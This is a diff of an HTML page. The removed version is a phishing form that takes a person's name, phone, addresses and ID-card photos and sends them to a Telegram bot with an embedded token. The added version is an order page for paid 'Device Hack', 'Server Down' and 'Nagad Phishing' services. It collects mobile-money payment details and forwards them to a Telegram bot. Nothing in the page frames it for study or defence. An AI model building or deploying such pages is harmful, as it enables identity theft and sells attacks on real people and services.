@@ -1,166 +1,240 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>ECOS BD ADMIN</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>BD.71 CYBER TEAM</title>
   <style>
-    body {
+    * {
       margin: 0;
+      padding: 0;
+      box-sizing: border-box;
       font-family: 'Segoe UI', sans-serif;
+    }
+    body {
       background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
       color: white;
       display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 40px 20px;
-    }
-
-    h1 {
-      font-size: 2.5rem;
-      background: linear-gradient(90deg, #00c6ff, #0072ff);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      animation: fadeInDown 1s ease-out;
-    }
-
-    @keyframes fadeInDown {
-      0% { transform: translateY(-50px); opacity: 0; }
-      100% { transform: translateY(0); opacity: 1; }
-    }
-
-    form {
-      width: 100%;
-      max-width: 500px;
-      background: rgba(255, 255, 255, 0.05);
-      border-radius: 15px;
-      padding: 25px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.4);
-      backdrop-filter: blur(10px);
-      animation: fadeInUp 1s ease-out;
-    }
-
-    @keyframes fadeInUp {
-      0% { transform: translateY(50px); opacity: 0; }
-      100% { transform: translateY(0); opacity: 1; }
-    }
-
-    input, textarea {
-      width: 100%;
-      padding: 12px;
-      margin-top: 12px;
-      border: none;
-      border-radius: 8px;
-      background: rgba(255,255,255,0.2);
-      color: white;
-      font-size: 16px;
-      outline: none;
-    }
-
-    input[type="file"] {
-      background: rgba(255,255,255,0.1);
-    }
-
-    button {
-      width: 100%;
-      padding: 12px;
-      margin-top: 20px;
-      background: #00c6ff;
-      border: none;
-      border-radius: 10px;
-      font-size: 18px;
-      color: white;
-      cursor: pointer;
-      transition: background 0.3s ease;
-    }
-
-    button:hover {
-      background: #0072ff;
-    }
-
-    .success-message {
-      display: none;
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw; height: 100vh;
-      background: #2ecc71;
-      color: white;
-      font-size: 24px;
       justify-content: center;
       align-items: center;
-      z-index: 999;
+      height: 100vh;
+      overflow: hidden;
     }
-
+    .container {
+      background: rgba(0,0,0,0.7);
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 20px #00ffc8;
+      width: 90%;
+      max-width: 500px;
+      animation: fadeIn 1s ease-in-out;
+    }
+    h1 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #00ffc8;
+    }
+    .section {
+      display: none;
+      flex-direction: column;
+      gap: 15px;
+      animation: fadeIn 0.5s ease-in-out;
+    }
+    .section.active {
+      display: flex;
+    }
+    select, input[type=text], input[type=file] {
+      padding: 10px;
+      border-radius: 8px;
+      border: none;
+    }
+    button {
+      padding: 12px;
+      background-color: #00ffc8;
+      color: #000;
+      font-weight: bold;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    button:hover {
+      background-color: #00c9a7;
+    }
+    .copy-btn {
+      background: #555;
+      color: #fff;
+      font-size: 12px;
+      padding: 4px 8px;
+      border-radius: 6px;
+      margin-left: 10px;
+    }
+    .back-btn {
+      background-color: #ff4d4d;
+    }
+    #amountBox {
+      font-weight: bold;
+      font-size: 16px;
+      margin-top: -10px;
+      margin-bottom: 10px;
+    }
+    #successSection {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+    #successSection h2 {
+      color: #00ffcc;
+      font-size: 26px;
+      margin-bottom: 20px;
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes fadeIn {
+      from {opacity: 0; transform: scale(0.95);}
+      to {opacity: 1; transform: scale(1);}
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.05); opacity: 0.8; }
+      100% { transform: scale(1); opacity: 1; }
+    }
   </style>
 </head>
 <body>
+  <div class="container">
+    <h1>BD.71 CYBER TEAM</h1>
 
-  <h1>ECOS BD ADMIN</h1>
+    <!-- Step 1 -->
+    <div class="section active" id="step1">
+      <select id="method">
+        <option disabled selected>Select Sylhet Method</option>
+        <option value="Device Hack">Device Hack - 200৳</option>
+        <option value="Server Down">Server Down - 200৳</option>
+        <option value="Nagad Phishing">Nagad Phishing - 200৳</option>
+      </select>
 
-  <form id="userForm">
-    <input type="text" name="name" placeholder="Enter your full name" required>
-    <input type="text" name="phone" placeholder="Enter your personal number" required>
-    <textarea name="current" placeholder="Enter current address" required></textarea>
-    <textarea name="permanent" placeholder="Enter permanent address" required></textarea>
-    <label style="margin-top:15px;">Upload ID Front Part:</label>
-    <input type="file" name="idFront" accept="image/*" required>
-    <label style="margin-top:15px;">Upload ID Back Part:</label>
-    <input type="file" name="idBack" accept="image/*" required>
-    <button type="submit">Submit</button>
-  </form>
+      <select id="platform">
+        <option disabled selected>Select Platform</option>
+        <option value="Telegram">Telegram</option>
+        <option value="WhatsApp">WhatsApp</option>
+      </select>
 
-  <div class="success-message" id="successMessage">
-    ✅ Submitted Successfully!
+      <input type="text" id="userContact" placeholder="Enter your Telegram Username or WhatsApp Number" />
+
+      <button onclick="nextStep()">Next</button>
+    </div>
+
+    <!-- Step 2 -->
+    <div class="section" id="step2">
+      <select id="paymentMethod">
+        <option disabled selected>Select Payment Method</option>
+        <option value="Bkash">Bkash</option>
+        <option value="Nagad">Nagad</option>
+      </select>
+
+      <div id="amountBox" style="display: none;">Amount to Pay: 200৳</div>
+
+      <div id="paymentInfo" style="display: none;">
+        <p><span id="paymentLabel"></span>: <span id="paymentNumber"></span> <button class="copy-btn" onclick="copyNumber()">Copy</button></p>
+        <input type="text" id="transactionId" placeholder="Enter Transaction ID" />
+        <input type="file" id="screenshot" accept="image/*" />
+        <button onclick="placeOrder()">Place Order</button>
+      </div>
+      <button class="back-btn" onclick="goBackToStep1()">Back</button>
+    </div>
+
+    <!-- Success Message -->
+    <div class="section" id="successSection">
+      <h2>✅ Order Placed Successfully!</h2>
+      <p>Redirecting to home...</p>
+    </div>
   </div>
 
   <script>
-    const form = document.getElementById('userForm');
-    const success = document.getElementById('successMessage');
+    function nextStep() {
+      const method = document.getElementById('method').value;
+      const platform = document.getElementById('platform').value;
+      const contact = document.getElementById('userContact').value.trim();
 
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
+      if (!method || !platform || !contact) {
+        alert('Please complete all fields.');
+        return;
+      }
 
-      const name = form.name.value;
-      const phone = form.phone.value;
-      const current = form.current.value;
-      const permanent = form.permanent.value;
+      document.getElementById('step1').classList.remove('active');
+      document.getElementById('step2').classList.add('active');
+    }
 
-      const idFront = form.idFront.files[0];
-      const idBack = form.idBack.files[0];
+    function goBackToStep1() {
+      document.getElementById('step2').classList.remove('active');
+      document.getElementById('step1').classList.add('active');
+    }
 
-      const botToken = '7740440025:AAEiGnCvT10rcNe3fwDS-l-jLJjCWGyT0Lk';
-      const chatId = '6593402184';
+    document.getElementById('paymentMethod').addEventListener('change', function () {
+      const method = this.value;
+      const label = document.getElementById('paymentLabel');
+      const number = document.getElementById('paymentNumber');
+      const info = document.getElementById('paymentInfo');
+      const amountBox = document.getElementById('amountBox');
 
-      // Send text data
-      const message = `📋 New User Submission:\n\n👤 Name: ${name}\n📞 Phone: ${phone}\n🏠 Current Address: ${current}\n🏡 Permanent Address: ${permanent}`;
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: message })
-      });
+      amountBox.style.display = 'block';
 
-      // Send ID front
-      const fd1 = new FormData();
-      fd1.append('chat_id', chatId);
-      fd1.append('photo', idFront);
-      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-        method: 'POST',
-        body: fd1
-      });
+      if (method === 'Bkash') {
+        label.textContent = 'Bkash';
+        number.textContent = '01750631170';
+      } else if (method === 'Nagad') {
+        label.textContent = 'Nagad';
+        number.textContent = '01842145643';
+      }
 
-      // Send ID back
-      const fd2 = new FormData();
-      fd2.append('chat_id', chatId);
-      fd2.append('photo', idBack);
-      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-        method: 'POST',
-        body: fd2
-      });
-
-      form.reset();
-      success.style.display = 'flex';
+      info.style.display = 'block';
     });
-  </script>
 
+    function copyNumber() {
+      const number = document.getElementById('paymentNumber').textContent;
+      navigator.clipboard.writeText(number);
+      alert('Number copied to clipboard!');
+    }
+
+    function placeOrder() {
+      const method = document.getElementById('method').value;
+      const platform = document.getElementById('platform').value;
+      const contact = document.getElementById('userContact').value.trim();
+      const paymentMethod = document.getElementById('paymentMethod').value;
+      const transactionId = document.getElementById('transactionId').value.trim();
+      const screenshot = document.getElementById('screenshot').files[0];
+
+      if (!transactionId || !screenshot) {
+        alert('Please provide transaction ID and screenshot.');
+        return;
+      }
+
+      const formData = new FormData();
+      formData.append('chat_id', '01O2I28');
+      formData.append('caption', `🛡️ *New Order - BD.71 CYBER TEAM*\n\n🔘 Method: ${method}\n📲 Platform: ${platform}\n👤 Contact: ${contact}\n💳 Payment: ${paymentMethod}\n💰 Amount: 200৳\n🧾 TXN ID: ${transactionId}`);
+      formData.append('photo', screenshot);
+
+      fetch(`https://api.telegram.org/botSKSK29WOWJSQ82812/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      })
+        .then(res => res.json())
+        .then(data => {
+          if (data.ok) {
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('successSection').classList.add('active');
+            setTimeout(() => {
+              document.getElementById('successSection').classList.remove('active');
+              document.getElementById('step1').classList.add('active');
+            }, 2000);
+          } else {
+            alert('Failed to place order.');
+          }
+        })
+        .catch(() => alert('Error sending order.'));
+    }
+  </script>
 </body>
 </html>
